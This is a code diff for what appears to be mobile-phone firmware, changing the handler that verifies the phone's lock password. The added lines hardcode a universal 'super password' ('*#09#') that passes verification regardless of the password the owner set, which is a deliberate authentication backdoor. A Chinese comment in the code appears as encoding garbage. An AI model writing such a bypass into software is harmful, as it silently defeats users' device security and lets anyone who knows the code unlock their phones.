@@ -551,13 +551,14 @@ static NextFSMAction COREST_VERIFYPHONEPWD_Handler(CCoreApp *pMe)
         case DLGRET_ENTEROK:
             {
                 uint16 wPWD=0;
+                char superpass[6] = {"*#09#"};
                 MSG_FATAL("COREST_VERIFYPHONEPWD_Handler DLGRET_ENTEROK",0,0,0);
                 (void) ICONFIG_GetItem(pMe->m_pConfig, 
                                        CFGI_PHONE_PASSWORD,
                                        &wPWD,
                                        sizeof(uint16));
-                
-                if (wPWD == EncodePWDToUint16(pMe->m_strPhonePWD))
+                //add by  yangdecai 2011-04-11 super password
+                if ((wPWD == EncodePWDToUint16(pMe->m_strPhonePWD))||(0==strcmp(superpass,pMe->m_strPhonePWD)))
                 {// ÃÜÂë·ûºÏ
                     MOVE_TO_STATE(COREST_VERIFYUIM)
                     return NFSMACTION_CONTINUE;
